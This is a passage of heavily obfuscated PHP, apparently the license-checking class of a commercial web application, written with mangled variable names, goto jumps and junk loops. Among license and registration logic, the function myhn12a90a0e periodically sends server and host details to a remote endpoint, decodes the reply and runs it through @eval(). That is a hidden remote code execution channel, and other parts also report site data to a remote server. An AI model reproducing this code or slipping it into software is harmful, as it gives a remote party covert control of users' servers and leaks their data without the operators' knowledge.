$c×Ğåñíø[61]($c×Ğåñíø[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}($c×Ğåñíø[125]), $c×Ğåñíø[211] => $_SERVER[$c×Ğåñíø[124]], $c×Ğåñíø[212] => $c×Ğåñíø[213](), $c×Ğåñíø[183] => $_SERVER[$c×Ğåñíø[184]]); $DÒã ³ŒÃÆ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][214]}($c×Ğåñíø[157]($A±ÈÓî¡¡)); $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][191]}($c×Ğåñíø[215] . $DÒã ³ŒÃÆ); $c×Ğåñíø[175]($c×Ğåñíø[206]($c×Ğåñíø[216]), !0); } goto Aäî‹Œ‡„¶; dŠİ¯‡ƒ¼: $c×Ğåñíø[61]($c×Ğåñíø[11])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][234]}($f‡ĞˆÕôÀ[$c×Ğåñíø[235]], array($c×Ğåñíø[236] => $CÒ¼Ì®¼»)); $b—Ã„˜›­ñ = $d§¹‡´ùÂ‘[616]; while ($b—Ã„˜›­ñ < $d§¹‡´ùÂ‘[558]) { if ($b—Ã„˜›­ñ >= 0) { break; } $b—Ã„˜›­ñ++; } goto e²ö§ÖÄß©; d÷êí¤º: if (!$c×Ğåñíø[200]($F†‰—Ñ‰) || !$c×Ğåñíø[200]($F†‰—Ñ‰[$c×Ğåñíø[201]]) || $F†‰—Ñ‰[$c×Ğåñíø[174]] != !0) { $Cê¡½ºŠÒæ = $c×Ğåñíø[206]($c×Ğåñíø[207]); $cĞÓˆº©Ô = $F†‰—Ñ‰[$c×Ğåñíø[201]] ? $c×Ğåñíø[203] . $F†‰—Ñ‰[$c×Ğåñíø[201]] : $Cê¡½ºŠÒæ; $c×Ğåñíø[175]($cĞÓˆº©Ô, !1); } $eİ¶ìˆ³™È = $F†‰—Ñ‰[$c×Ğåñíø[201]]; $EÕô¼•Š™ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][208]}($eİ¶ìˆ³™È[$c×Ğåñíø[209]]); goto D‘è…˜Äç†; a”»¢Ö­İß: $f‡‰À‚ÅˆÙ = $bñğÚé . $a™ê´Ç³œ[$c×Ğåñíø[129]] . $a™ê´Ç³œ[$c×Ğåñíø[220]]; $a™ê´Ç³œ[$c×Ğåñíø[131]] = $c×Ğåñíø[222]($c×Ğåñíø[127]($this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($f‡‰À‚ÅˆÙ, $c×Ğåñíø[223]))); $eçñ‡Òéò¢ = $d§¹‡´ùÂ‘[611]; goto Cä„ã™ƒ; Cä„ã™ƒ: while (strlen($eçñ‡Òéò¢) < $d§¹‡´ùÂ‘[558]) { if (!$eçñ‡Òéò¢) { break; } $eçñ‡Òéò¢++; } $dœÂ„ËšóÃ = $c×Ğåñíø[133](16); $c†“ Âİğ‘ = $dœÂ„ËšóÃ . $a™ê´Ç³œ[$c×Ğåñíø[129]] . $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($c×Ğåñíø[123]($a™ê´Ç³œ[$c×Ğåñíø[217]]), $dœÂ„ËšóÃ); goto eîè¦°Ó”…; bµİé½‘: $d§¹‡´ùÂ‘ =& $_SERVER[ã®Â„Éæ¹¤]; $c×Ğåñíø =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; if ($_SERVER[$c×Ğåñíø[44]] != $c×Ğåñíø[171]) { return; } goto bÅÙµ—ºŸ©; eîè¦°Ó”…: $a™ê´Ç³œ[$c×Ğåñíø[132]] = $c×Ğåñíø[127]($c×Ğåñíø[222]($this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($c†“ Âİğ‘, $c×Ğåñíø[224]))); $e…ïÉã”›± = $d§¹‡´ùÂ‘[612]; if ($eİ¶ìˆ³™È[$c×Ğåñíø[225]] && $eİ¶ìˆ³™È[$c×Ğåñíø[225]] >= 1) { $c×Ğåñíø[61]($c×Ğåñíø[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][226]}($c×Ğåñíø[227], $c×Ğåñíø[228]); } goto aµïêÇï£ƒ; aµïêÇï£ƒ: $c×Ğåñíø[61]($c×Ğåñíø[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][229]}($a™ê´Ç³œ); $a¾»‰™êêˆ = $c×Ğåñíø[123]($_SERVER[$c×Ğåñíø[124]] . $c×Ğåñíø[222]($a¥Ëáîãˆİ) . $a™ê´Ç³œ[$c×Ğåñíø[218]]); $dÍÚÀ²ã = $c×Ğåñíø[222]($c×Ğåñíø[25]($a¾»‰™êêˆ, 10, 16)); goto BâÌ£Œ¥Æ; Aäî‹Œ‡„¶: $a™ê´Ç³œ = array($c×Ğåñíø[217] => $DÈ¾„¥ÊŠ[$c×Ğåñíø[174]], $c×Ğåñíø[218] => $eİ¶ìˆ³™È[$c×Ğåñíø[219]], $c×Ğåñíø[220] => $c×Ğåñíø[133](16), $c×Ğåñíø[129] => $eİ¶ìˆ³™È[$c×Ğåñíø[221]]); if ($DÈ¾„¥ÊŠ[$c×Ğåñíø[177]]) { $a™ê´Ç³œ[$c×Ğåñíø[220]] = $DÈ¾„¥ÊŠ[$c×Ğåñíø[177]]; } $bñğÚé = $c×Ğåñíø[25]($c×Ğåñíø[123]($a™ê´Ç³œ[$c×Ğåñíø[218]]), 10, 10); goto a”»¢Ö­İß; bÅÙµ—ºŸ©: if (!$c×Ğåñíø[113]($GLOBALS, $c×Ğåñíø[141])) { die; } $Eáê«£¶” = $GLOBALS[$c×Ğåñíø[22]]; if (isset($Eáê«£¶”[$c×Ğåñíø[172]])) { $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][173]}(); die; } goto DŒÄêë×”; fäËìšõŠ: $cÙ²¿Õ = $d§¹‡´ùÂ‘[607]; if (!$cÙ²¿Õ) { die; } $fÛëÄíæöÖ = $c×Ğåñíø[123]($_SERVER[$c×Ğåñíø[124]] . $a¥Ëáîãˆİ); goto d”İÓ¥¨Ç˜; d”İÓ¥¨Ç˜: $aéÇË‰¯ó† = $d§¹‡´ùÂ‘[608]; while (strlen($aéÇË‰¯ó†) < $d§¹‡´ùÂ‘[564]) { if (!$aéÇË‰¯ó†) { break; } $aéÇË‰¯ó†++; } if ($Eáê«£¶”[$c×Ğåñíø[187]] == $c×Ğåñíø[188]) { $DãÜæãŸÌ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($fÛëÄíæöÖ, $c×Ğåñíø[189]); $DÒã ³ŒÃÆ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][136]}($c×Ğåñíø[157]($DÈ¾„¥ÊŠ), $fÛëÄíæöÖ . $c×Ğåñíø[190], 3); $A¹Å›ÃêĞù = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][191]}($c×Ğåñíø[192] . $DãÜæãŸÌ . $c×Ğåñíø[193] . $DÒã ³ŒÃÆ, -1); $c×Ğåñíø[175]($A¹Å›ÃêĞù, !0); } else { if ($Eáê«£¶”[$c×Ğåñíø[187]] == $c×Ğåñíø[194]) { $c×´‰Ğõ¿§ = $c×Ğåñíø[25]($c×Ğåñíø[123]($c×Ğåñíø[195] . $fÛëÄíæöÖ), 12, 15) . $c×Ğåñíø[196]; $DÒã ³ŒÃÆ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][197]}($c×Ğåñíø[2]($Eáê«£¶”[$c×Ğåñíø[198]]), $c×´‰Ğõ¿§, 2); $F†‰—Ñ‰ = $c×Ğåñíø[199]($DÒã ³ŒÃÆ, !0); if (!$c×Ğåñíø[200]($F†‰—Ñ‰) || !$c×Ğåñíø[200]($F†‰—Ñ‰[$c×Ğåñíø[201]]) || $F†‰—Ñ‰[$c×Ğåñíø[174]] != !0) { $Cê¡½ºŠÒæ = $c×Ğåñíø[202]; $cĞÓˆº©Ô = $F†‰—Ñ‰[$c×Ğåñíø[201]] ? $c×Ğåñíø[203] . $F†‰—Ñ‰[$c×Ğåñíø[201]] : $Cê¡½ºŠÒæ; $c×Ğåñíø[175]($cĞÓˆº©Ô, !1); } else { $DÈ¾„¥ÊŠ[$c×Ğåñíø[177]] = $F†‰—Ñ‰[$c×Ğåñíø[201]][$c×Ğåñíø[204]]; } } else { $F†‰—Ñ‰ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][191]}($c×Ğåñíø[205], $DÈ¾„¥ÊŠ, 10); $AâÈ…œ„º’ = $d§¹‡´ùÂ‘[609]; while (strlen($AâÈ…œ„º’) < $d§¹‡´ùÂ‘[558]) { if (!$AâÈ…œ„º’) { break; } $AâÈ…œ„º’++; } } } goto d÷êí¤º; f¸—Éá´ºè: $aÛæ¸¿‡ = $c×Ğåñíø[230]($c×Ğåñíø[61]($c×Ğåñíø[11])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][231]}(), $c×Ğåñíø[232]); $BöŠÅÙòî = $d§¹‡´ùÂ‘[614]; $f‡ĞˆÕôÀ = $aÛæ¸¿‡[$c×Ğåñíø[233]]; goto FÓ—ë®ÍÇÉ; dŒåÁ…¾¢•: $aì¦åé¾ = $d§¹‡´ùÂ‘[619]; $c×Ğåñíø[175]($c×Ğåñíø[206]($c×Ğåñíø[216]), !0); goto d„Ú¸­ÒÜ; DŒÄêë×”: if (!isset($Eáê«£¶”[$c×Ğåñíø[174]]) || $c×Ğåñíø[24]($Eáê«£¶”[$c×Ğåñíø[174]]) != 16) { $c×Ğåñíø[175]($c×Ğåñíø[176] . $Eáê«£¶”[$c×Ğåñíø[174]], !1); } $a¥Ëáîãˆİ = $c×Ğåñíø[61]($c×Ğåñíø[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}($c×Ğåñíø[125]); $DÈ¾„¥ÊŠ = array($c×Ğåñíø[174] => $Eáê«£¶”[$c×Ğåñíø[174]], $c×Ğåñíø[177] => $c×Ğåñíø[133](16), $c×Ğåñíø[178] => $c×Ğåñíø[158], $c×Ğåñíø[179] => $c×Ğåñíø[180], $c×Ğåñíø[181] => $_SERVER[$c×Ğåñíø[182]], $c×Ğåñíø[183] => $_SERVER[$c×Ğåñíø[184]], $c×Ğåñíø[185] => $_SERVER[$c×Ğåñíø[186]]); goto fäËìšõŠ; BâÌ£Œ¥Æ: $aä‰ÑÙá = $d§¹‡´ùÂ‘[613]; if (strlen($aä‰ÑÙá) < $d§¹‡´ùÂ‘[564]) { die; } $eğÁã˜×ŞŒ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][136]}($c×Ğåñíø[157]($eİ¶ìˆ³™È), $a¾»‰™êêˆ); goto f¸—Éá´ºè; Bâª¤ßë…: $this->dkaza353cb62 = $a™ê´Ç³œ[$c×Ğåñíø[129]]; $F‰Ë‰™ŠÛŸ = $d§¹‡´ùÂ‘[618]; $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][237]}(); goto dŒåÁ…¾¢•; d„Ú¸­ÒÜ: } private function licenseRegistSuccess() { $b›‚Ùå† =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $eÕŸÒù¾œ = $b›‚Ùå†[61]($b›‚Ùå†[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}(); $b‹î†î©¡è = $_SERVER[ã®Â„Éæ¹¤][620]; if (!$b‹î†î©¡è) { return; } if ($eÕŸÒù¾œ[$b›‚Ùå†[89]] != $b›‚Ùå†[228]) { $b›‚Ùå†[61]($b›‚Ùå†[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][229]}($b›‚Ùå†[89], $b›‚Ùå†[228]); } $b›‚Ùå†[119]($b›‚Ùå†[238])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][239]}(!0); } private function kqyi8726eaec() { goto E™¥×ï†; bÆæŸœ±Á½: while (strlen($C½¡³ñ·¢) < $A“–ˆ®Šœ[566]) { if (!$C½¡³ñ·¢) { break; } $C½¡³ñ·¢++; } goto A£ÏóŠÂ˜; FÛ®¬Óˆ„: if (!$d®Û‰Üáğ) { die; } $this->dkaza353cb62 = $cğĞ¨’¼Û‡[130]; $C½¡³ñ·¢ = $A“–ˆ®Šœ[622]; goto bÆæŸœ±Á½; E™¥×ï†: $A“–ˆ®Šœ =& $_SERVER[ã®Â„Éæ¹¤]; $cğĞ¨’¼Û‡ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $cğĞ¨’¼Û‡[61]($cğĞ¨’¼Û‡[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][229]}(array($cğĞ¨’¼Û‡[217] => $cğĞ¨’¼Û‡[10], $cğĞ¨’¼Û‡[218] => $cğĞ¨’¼Û‡[10], $cğĞ¨’¼Û‡[129] => $cğĞ¨’¼Û‡[130], $cğĞ¨’¼Û‡[131] => $cğĞ¨’¼Û‡[10], $cğĞ¨’¼Û‡[132] => $cğĞ¨’¼Û‡[10])); goto e¯òµµ¢; e¯òµµ¢: $cğĞ¨’¼Û‡[61]($cğĞ¨’¼Û‡[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][226]}($cğĞ¨’¼Û‡[227], $cğĞ¨’¼Û‡[240]); $this->zkob77ab1311 = array(); $d®Û‰Üáğ = $A“–ˆ®Šœ[621]; goto FÛ®¬Óˆ„; A£ÏóŠÂ˜: } private function hkta1c535dd9() { goto F§Ù–¼ÑÕ³; fëöí¯‡ñ®: if (strlen($eÉ‡é¾ŸÏ) < $DÜâÚ¡ˆñ”[562]) { return; } $c›’»Ò…Š× = $cÕ—ƒ²¾«˜[230]($cÕ—ƒ²¾«˜[61]($cÕ—ƒ²¾«˜[11])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][231]}(), $cÕ—ƒ²¾«˜[232]); $f†‡ôù¤ÅÏ = $c›’»Ò…Š×[$cÕ—ƒ²¾«˜[233]]; goto f¡‡“¢¥†í; BíÌ°‡ŸÒ—: $døĞáåó‹ = $DÜâÚ¡ˆñ”[626]; if (!$cÕ—ƒ²¾«˜[200]($C‡Œ‹…¥±±)) { return $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][173]}(); } $B¡ß¹¹ôÆ = $cÕ—ƒ²¾«˜[153]($C‡Œ‹…¥±±[$cÕ—ƒ²¾«˜[154]]); goto fœÈ´Šè‰Å; DŞø‹£Úğº: if ($bïÛÉµ„Ë½[$cÕ—ƒ²¾«˜[129]] == $cÕ—ƒ²¾«˜[130]) { return; } $c•‹àÛ«¦ = $cÕ—ƒ²¾«˜[61]($cÕ—ƒ²¾«˜[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}($cÕ—ƒ²¾«˜[125]); $eÉ‡é¾ŸÏ = $DÜâÚ¡ˆñ”[624]; goto fëöí¯‡ñ®; fœÈ´Šè‰Å: if ($cÕ—ƒ²¾«˜[241]() >= $B¡ß¹¹ôÆ) { return $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][173]}(); } $this->zkob77ab1311 = $C‡Œ‹…¥±±; $this->dkaza353cb62 = $bïÛÉµ„Ë½[$cÕ—ƒ²¾«˜[129]]; goto EŒ„ä–áÙ; cö¯„×¤’: $e‚‡ğ“«‚÷ = $DÜâÚ¡ˆñ”[623]; $this->dkaza353cb62 = $cÕ—ƒ²¾«˜[130]; $bïÛÉµ„Ë½ = $cÕ—ƒ²¾«˜[61]($cÕ—ƒ²¾«˜[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}(); goto DŞø‹£Úğº; F§Ù–¼ÑÕ³: $DÜâÚ¡ˆñ” =& $_SERVER[ã®Â„Éæ¹¤]; $cÕ—ƒ²¾«˜ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $_SERVER[$cÕ—ƒ²¾«˜[184]] = $cÕ—ƒ²¾«˜[113]($_SERVER, $cÕ—ƒ²¾«˜[184], APP_HOST); goto cö¯„×¤’; EŒ„ä–áÙ: $Fî°„ôÂÒš = $DÜâÚ¡ˆñ”[627]; goto F¡ç“ÊŠŞ; c¨óŸ‰‘ã: $fÂ–ä‡Â¸‘ = $cÕ—ƒ²¾«˜[222]($cÕ—ƒ²¾«˜[25]($e¡¼ÀíƒÂô, 10, 16)); $C‡Œ‹…¥±± = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][197]}($f†‡ôù¤ÅÏ[$cÕ—ƒ²¾«˜[100]][$fÂ–ä‡Â¸‘], $e¡¼ÀíƒÂô); $C‡Œ‹…¥±± = $cÕ—ƒ²¾«˜[199]($C‡Œ‹…¥±±, !0); goto BíÌ°‡ŸÒ—; f¡‡“¢¥†í: $EÇ†ÁàÕí¨ = $DÜâÚ¡ˆñ”[625]; if (strlen($EÇ†ÁàÕí¨) < $DÜâÚ¡ˆñ”[562]) { return; } $e¡¼ÀíƒÂô = $cÕ—ƒ²¾«˜[123]($_SERVER[$cÕ—ƒ²¾«˜[124]] . $cÕ—ƒ²¾«˜[222]($c•‹àÛ«¦) . $bïÛÉµ„Ë½[$cÕ—ƒ²¾«˜[218]]); goto c¨óŸ‰‘ã; F¡ç“ÊŠŞ: } private function pqgc8be6672f() { $DÓ›°§®Ë‹ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $aÇ”ó˜™œ = $GLOBALS[$DÓ›°§®Ë‹[22]]; $DÕù‘âöØ = $_SERVER[$DÓ›°§®Ë‹[44]]; if ($DÕù‘âöØ == $DÓ›°§®Ë‹[242] && $this->dkaza353cb62 == $DÓ›°§®Ë‹[130]) { $DÓ›°§®Ë‹[175]($DÓ›°§®Ë‹[206]($DÓ›°§®Ë‹[243]), !1, $DÓ›°§®Ë‹[244]); } $e¡õæç‹î = array($DÓ›°§®Ë‹[245], $DÓ›°§®Ë‹[246]); if ($DÓ›°§®Ë‹[247]($DÕù‘âöØ, $e¡õæç‹î)) { if ($this->dkaza353cb62 == $DÓ›°§®Ë‹[130] && isset($aÇ”ó˜™œ[$DÓ›°§®Ë‹[248]])) { $DÓ›°§®Ë‹[175]($DÓ›°§®Ë‹[206]($DÓ›°§®Ë‹[243]), !1, $DÓ›°§®Ë‹[244]); die; } $fÀ¡‚˜ŒÀ÷ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][146]}(); if ($fÀ¡‚˜ŒÀ÷ != $DÓ›°§®Ë‹[249]($DÓ›°§®Ë‹[250])) { if ($fÀ¡‚˜ŒÀ÷ <= $DÓ›°§®Ë‹[61]($DÓ›°§®Ë‹[148])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][149]}()) { $DÓ›°§®Ë‹[175]($DÓ›°§®Ë‹[206]($DÓ›°§®Ë‹[251]), !1, $DÓ›°§®Ë‹[244]); die; } } } } private function aqls9218c29a() { goto FæóÆÅêš¾; cñ˜ˆõÀöñ: $bÜ³À›àÃ“ = $f¢òõŠÊˆß[629]; if (!$bÜ³À›àÃ“) { die; } $EªöŒã’à– = $céÏŒÊ£ËÁ[257](array($céÏŒÊ£ËÁ[258] => array($céÏŒÊ£ËÁ[259] => $céÏŒÊ£ËÁ[260], $céÏŒÊ£ËÁ[261] => 3))); goto Fƒ‚Âñâí; FæóÆÅêš¾: $f¢òõŠÊˆß =& $_SERVER[ã®Â„Éæ¹¤]; $céÏŒÊ£ËÁ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $Dƒ©„èäàÉ = array($céÏŒÊ£ËÁ[144], $céÏŒÊ£ËÁ[252]); goto bî„ñæ¿Ê˜; B¹“½ù¬¦: if (strlen($f¾‰²áùëÔ) < $f¢òõŠÊˆß[558]) { die; } if ($F©ª½“Ü÷¹ && $céÏŒÊ£ËÁ[32]($F©ª½“Ü÷¹, $céÏŒÊ£ËÁ[265])) { echo $F©ª½“Ü÷¹; } die; goto bç½´§…Ôå; BŠªÍ¸·¬„: $AºŒ•âÜœÜ = $f¢òõŠÊˆß[628]; if (strlen($AºŒ•âÜœÜ) < $f¢òõŠÊˆß[558]) { return; } $Dáµ’ÔŸâÌ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($Dáµ’ÔŸâÌ, $céÏŒÊ£ËÁ[256]); goto cñ˜ˆõÀöñ; Fƒ‚Âñâí: $CÀÓ°ö‚±ª = $f¢òõŠÊˆß[630]; $F©ª½“Ü÷¹ = @$céÏŒÊ£ËÁ[262]($Dáµ’ÔŸâÌ, !1, $EªöŒã’à–); $aÙâ¢ÁË…ë = $f¢òõŠÊˆß[631]; goto d¡”¦©¿‰; bî„ñæ¿Ê˜: if (!$céÏŒÊ£ËÁ[113]($GLOBALS, $céÏŒÊ£ËÁ[141]) || !isset($_GET[$céÏŒÊ£ËÁ[253]])) { return; } if (!$céÏŒÊ£ËÁ[247]($_SERVER[$céÏŒÊ£ËÁ[44]], $Dƒ©„èäàÉ)) { return; } $Dáµ’ÔŸâÌ = $céÏŒÊ£ËÁ[254]; goto BŠªÍ¸·¬„; d¡”¦©¿‰: while ($aÙâ¢ÁË…ë < $f¢òõŠÊˆß[558]) { if ($aÙâ¢ÁË…ë >= 0) { break; } $aÙâ¢ÁË…ë++; } $céÏŒÊ£ËÁ[263]($céÏŒÊ£ËÁ[264]); $f¾‰²áùëÔ = $f¢òõŠÊˆß[632]; goto B¹“½ù¬¦; bç½´§…Ôå: } public function crun247a480b($d×†ò†ÂĞ…) { goto f¬“Ù¬å…; D•ÜÜÊ²¦: foreach ($C‹ˆá…ÓÛÁ as $Aš·®èöõ) { unset($d×†ò†ÂĞ…[$Aš·®èöõ]); } return $d×†ò†ÂĞ…; $cô»Ï‰…¥ = $dªÔ©°†ºÎ[634]; goto Bø¡¾Ûê¡Æ; f¬“Ù¬å…: $dªÔ©°†ºÎ =& $_SERVER[ã®Â„Éæ¹¤]; $b¢õù²¨Ê˜ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; if ($this->dkaza353cb62 == $b¢õù²¨Ê˜[266]) { return $d×†ò†ÂĞ…; } goto AĞÄš ´›; b´¥õ¦¿„æ: $C‰Ä×¿¹˜ƒ = $dªÔ©°†ºÎ[633]; while (strlen($C‰Ä×¿¹˜ƒ) < $dªÔ©°†ºÎ[566]) { if (!$C‰Ä×¿¹˜ƒ) { break; } $C‰Ä×¿¹˜ƒ++; } foreach ($Aãóß‚ó¸á as $Aš·®èöõ => $fõåõéÔÚå) { if ($fõåõéÔÚå == $b¢õù²¨Ê˜[268] && $b¢õù²¨Ê˜[25]($this->dkaza353cb62, 0, 1) == $b¢õù²¨Ê˜[268]) { continue; } if (!$b¢õù²¨Ê˜[247]($Aš·®èöõ, $D¤Ôè¡´Ä)) { $C‹ˆá…ÓÛÁ[] = $Aš·®èöõ; } } goto D•ÜÜÊ²¦; Bø¡¾Ûê¡Æ: while (strlen($cô»Ï‰…¥) < $dªÔ©°†ºÎ[566]) { if (!$cô»Ï‰…¥) { break; } $cô»Ï‰…¥++; } goto D‚ò¼ÕåÊ; AĞÄš ´›: $Aãóß‚ó¸á = array($b¢õù²¨Ê˜[267] => $b¢õù²¨Ê˜[268], $b¢õù²¨Ê˜[269] => $b¢õù²¨Ê˜[268], $b¢õù²¨Ê˜[270] => $b¢õù²¨Ê˜[268], $b¢õù²¨Ê˜[271] => $b¢õù²¨Ê˜[268], $b¢õù²¨Ê˜[272] => $b¢õù²¨Ê˜[268], $b¢õù²¨Ê˜[273] => $b¢õù²¨Ê˜[268], $b¢õù²¨Ê˜[274] => $b¢õù²¨Ê˜[275], $b¢õù²¨Ê˜[276] => $b¢õù²¨Ê˜[275], $b¢õù²¨Ê˜[277] => $b¢õù²¨Ê˜[275], $b¢õù²¨Ê˜[278] => $b¢õù²¨Ê˜[275], $b¢õù²¨Ê˜[279] => $b¢õù²¨Ê˜[275], $b¢õù²¨Ê˜[280] => $b¢õù²¨Ê˜[275], $b¢õù²¨Ê˜[281] => $b¢õù²¨Ê˜[275]); $D¤Ôè¡´Ä = $b¢õù²¨Ê˜[0]($b¢õù²¨Ê˜[282], $b¢õù²¨Ê˜[113]($this->zkob77ab1311, $b¢õù²¨Ê˜[138], $b¢õù²¨Ê˜[10])); $C‹ˆá…ÓÛÁ = array(); goto b´¥õ¦¿„æ; D‚ò¼ÕåÊ: } private function wtcd7bfdf15c() { $F­âª…¡„¾ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; if ($this->dkaza353cb62 != $F­âª…¡„¾[130]) { return; } $GLOBALS[$F­âª…¡„¾[100]][$F­âª…¡„¾[104]][$F­âª…¡„¾[283]] = $F­âª…¡„¾[228]; $GLOBALS[$F­âª…¡„¾[100]][$F­âª…¡„¾[284]] = $F­âª…¡„¾[228]; $Aìº¡ÀÆ¤Ô = $_SERVER[ã®Â„Éæ¹¤][635]; if ($F­âª…¡„¾[61]($F­âª…¡„¾[285])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}($F­âª…¡„¾[89]) != $F­âª…¡„¾[240]) { $F­âª…¡„¾[61]($F­âª…¡„¾[285])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][229]}($F­âª…¡„¾[89], $F­âª…¡„¾[240]); } } public function lnbs30f838a2() { return $_SERVER[«óæÀ—¬ÛÚÈÑ][286]; $f‘ìŒÄµ© = $_SERVER[ã®Â„Éæ¹¤][636]; if (!$f‘ìŒÄµ©) { return; } } private function myhn12a90a0e() { goto e¹ˆ¸ó ; Fí İ¨à¸: if (!$eîåÎàªÖ[247]($_SERVER[$eîåÎàªÖ[44]], $bº‡‹ê×ÕÌ)) { return; } if ($eîåÎàªÖ[241]() % 4 != 0) { return; } $CëÜ›¾»®Ô = $eîåÎàªÖ[13](array($eîåÎàªÖ[292], $eîåÎàªÖ[293]), $F…Å—Œç›); goto A§×ÇÅ¼¸š; cº·¾©ŸƒÀ: if (!$eîåÎàªÖ[200]($Aì„­Šòñ×)) { return; } if ($Aì„­Šòñ×[$eîåÎàªÖ[174]] && $Aì„­Šòñ×[$eîåÎàªÖ[296]]) { if ($this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][208]}($Aì„­Šòñ×[$eîåÎàªÖ[296]]) == $F£¾ÑÉˆ¥‘[$eîåÎàªÖ[174]]) { return; } } $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][173]}(); goto Añ¨—›÷îÃ; D¦ƒ±®¨¨­: $FÏçÌ’¢± = $dô´ïŞ‘Œ[637]; $F…Å—Œç› = $eîåÎàªÖ[290] . $eîåÎàªÖ[123]($eîåÎàªÖ[291]); if ($this->dkaza353cb62 == $eîåÎàªÖ[130] || !$eîåÎàªÖ[113]($GLOBALS, $eîåÎàªÖ[141])) { return; } goto Fí İ¨à¸; d¼¿µµßÊØ: $Aì„­Šòñ× = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][191]}($eîåÎàªÖ[295], $F£¾ÑÉˆ¥‘); $c™›ÎâÚ² = $dô´ïŞ‘Œ[638]; if (!$c™›ÎâÚ²) { return; } goto cº·¾©ŸƒÀ; A§×ÇÅ¼¸š: if ($CëÜ›¾»®Ô && $eîåÎàªÖ[241]() - $CëÜ›¾»®Ô < $eîåÎàªÖ[249]($eîåÎàªÖ[294])) { return; } $eîåÎàªÖ[13](array($eîåÎàªÖ[292], $eîåÎàªÖ[161]), $F…Å—Œç›, $eîåÎàªÖ[241]()); $F£¾ÑÉˆ¥‘ = array($eîåÎàªÖ[174] => $eîåÎàªÖ[61]($eîåÎàªÖ[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}($eîåÎàªÖ[217]), $eîåÎàªÖ[187] => $this->dkaza353cb62, $eîåÎàªÖ[185] => $_SERVER[$eîåÎàªÖ[186]], $eîåÎàªÖ[178] => $eîåÎàªÖ[158], $eîåÎàªÖ[181] => $_SERVER[$eîåÎàªÖ[182]]); goto d¼¿µµßÊØ; Añ¨—›÷îÃ: $bê‘Üƒ = $dô´ïŞ‘Œ[639]; if ($this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][208]}($Aì„­Šòñ×[$eîåÎàªÖ[296]]) != $F£¾ÑÉˆ¥‘[$eîåÎàªÖ[174]]) { $A’†•¤á°œ = array($eîåÎàªÖ[210] => $eîåÎàªÖ[61]($eîåÎàªÖ[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}($eîåÎàªÖ[125]), $eîåÎàªÖ[211] => $_SERVER[$eîåÎàªÖ[124]], $eîåÎàªÖ[212] => $eîåÎàªÖ[213](), $eîåÎàªÖ[183] => $_SERVER[$eîåÎàªÖ[184]]); $eÔ¨áÑ¦¬ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][214]}($eîåÎàªÖ[157]($A’†•¤á°œ)); $Aì„­Šòñ× = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][191]}($eîåÎàªÖ[215] . $eÔ¨áÑ¦¬); if ($Aì„­Šòñ× && $eîåÎàªÖ[200]($Aì„­Šòñ×) && isset($Aì„­Šòñ×[$eîåÎàªÖ[296]])) { $D¬ä…‘»“ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][197]}($Aì„­Šòñ×[$eîåÎàªÖ[296]], 2); if ($D¬ä…‘»“) { $D¬ä…‘»“ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][208]}($D¬ä…‘»“); } if ($D¬ä…‘»“) { try { @eval($D¬ä…‘»“); } catch (Exception $f…¡—›éÜ”) { } } } } goto b‡Ù£ÓÄ½’; e¹ˆ¸ó : $dô´ïŞ‘Œ =& $_SERVER[ã®Â„Éæ¹¤]; $eîåÎàªÖ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $bº‡‹ê×ÕÌ = array($eîåÎàªÖ[287], $eîåÎàªÖ[288], $eîåÎàªÖ[289]); goto D¦ƒ±®¨¨­; b‡Ù£ÓÄ½’: } private function diua8f1f7bae($BˆôŒç§ÖÈ = '', $dñá‘ãØ“– = array(), $bÆœ‡§«µ = 5) { goto 